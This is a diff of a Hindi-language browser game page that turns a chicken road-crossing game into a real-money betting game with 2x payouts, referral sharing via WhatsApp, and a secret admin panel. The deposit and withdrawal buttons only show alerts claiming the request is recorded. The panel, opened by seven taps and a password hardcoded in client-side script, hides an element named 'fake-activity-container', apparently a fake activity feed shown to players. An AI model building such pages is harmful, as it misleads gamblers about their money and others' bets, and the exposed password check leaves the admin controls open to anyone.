+                    document.getElementById('m-result-msg').innerHTML = `<span style="color: #00e676;">🎉 शानदार! मुर्गे ने छलांग लगाकर सड़क पार कर ली, ₹${winAmt} (2x) जीत गए!</span>`;
+                } else {
+                    document.getElementById('m-result-msg').innerHTML = `<span style="color: #ff5252;">💥 धड़ाम! SUV आगे बढ़ गई और मुर्गा चपेट में आ गया! ₹${bet} डूब गए।</span>`;
+                    mScore = 0;
+                    document.getElementById('m-score').innerText = mScore;
+                }
+                mResetGame();
+            }, 1000);
         }
+    }, 25);
+}
 
-        function resetChicken() {
-            chickenY = 410;
-            chickenX = 150;
-            chicken.style.left = chickenX + "px";
-        }
+function sendDepositReq() { alert("✅ डिपॉजिट अनुरोध दर्ज हो गया है!"); }
+function sendWithdrawReq() { alert("✅ विथड्रॉवल अनुरोध दर्ज हो गया है!"); }
 
-        function resetGame() {
-            score = 0;
-            scoreDisplay.innerText = score;
-            isAlive = true;
-            resetChicken();
-        }
+function copyReferLink() {
+  let linkInput = document.getElementById('ref-link-input');
+  linkInput.select();
+  navigator.clipboard.writeText(linkInput.value);
+  alert("🔗 Link copy ho gaya hai!");
+}
 
-        // गाड़ियों की रफ़्तार और टक्कर का लूप
-        function gameLoop() {
-            if (!isAlive) return;
+function shareOnWhatsApp() {
+  let gameUrl = window.location.href;
+  let message = "🔱 Thakur Sahab Creator Mahakal Battle khele, paheliyan suljhayein aur daily cash jeetein! Abhi join karein: " + gameUrl;
+  window.open("https://api.whatsapp.com/send?text=" + encodeURIComponent(message), '_blank');
+}
 
-            // कार 1 की गति (बाएं से दाएं)
-            car1X += 5;
-            if (car1X > 340) car1X = -70;
-            car1.style.left = car1X + "px";
+let tapC = 0, lastT = 0;
+function checkSecretAdminTap() {
+  let now = new Date().getTime();
+  if(now - lastT < 800) tapC++; else tapC = 1;
+  lastT = now;
+  if(tapC === 7) {
+    tapC = 0;
+    let p = prompt("गुप्त एडमिन पासवर्ड दर्ज करें:");
+    if(p === "78699") {
+      isAdminLoggedIn = true;
+      document.getElementById('fake-activity-container').style.display = "none";
+      document.getElementById('public-live-bets-section').style.display = "none";
+      document.getElementById('real-admin-container').style.display = "block";
+      document.getElementById('admin-panel-div').style.display = "block";
+    } else if(p !== null) {
+      alert("❌ गलत पासवर्ड!");
+    }
+  }
+}
 
-            // कार 2 की गति (दाएं से बाएं)
-            car2X -= 6;
-            if (car2X < -60) car2X = 340;
-            car2.style.left = car2X + "px";
-
-            // टक्कर की जाँच (Collision Check)
-            // मुर्गे की स्क्रीन पोजीशन निकालें
-            let cLeft = chickenX;
-            let cRight = chickenX + 35;
-            let cTop = chickenY;
-            let cBottom = chickenY + 35;
-
-            // कार 1 की पोजीशन
-            let car1Left = car1X;
-            let car1Right = car1X + 55;
-            let car1Top = 140;
-            let car1Bottom = 168;
-
-            // कार 2 की पोजीशन
-            let car2Left = car2X;
-            let car2Right = car2X + 55;
-            let car2Top = 270;
-            let car2Bottom = 298;
-
-            // टक्कर होने पर चेक करें
-            if (cTop < car1Bottom && cBottom > car1Top && cRight > car1Left && cLeft < car1Right) {
-                gameOver();
-            }
-
-            if (cTop < car2Bottom && cBottom > car2Top && cRight > car2Left && cLeft < car2Right) {
-                gameOver();
-            }
-        }
-
-        function gameOver() {
-            isAlive = false;
-            alert("धड़ाम! 💥 मुर्गा गाड़ी के नीचे आ गया और मर गया! सारे पैसे/पॉइंट्स खत्म ❌");
-            resetGame();
-        }
-
-        // गेम की स्पीड और मूवमेंट रन करने के लिए
-        setInterval(gameLoop, 30);
-    </script>
-
+function closeAdmin() { 
+  isAdminLoggedIn = false; 
+  document.getElementById('admin-panel-div').style.display = "none"; 
+  document.getElementById('real-admin-container').style.display = "none";
+  document.getElementById('fake-activity-container').style.display = "block";
+  document.getElementById('public-live-bets-section').style.display = "block";
+}
+</script>
 </body>
 </html>
